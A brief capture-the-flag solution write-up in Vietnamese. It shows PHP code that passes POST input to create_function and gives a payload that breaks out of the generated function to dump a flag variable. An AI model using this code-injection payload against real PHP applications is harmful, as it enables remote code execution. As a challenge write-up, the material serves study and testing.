# Solution

```php
if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
```

Sau một hồi test thì mình nhận ra có thể chèn php code thực tiếp vào luôn

Payload:

`} var_dump($flag);//`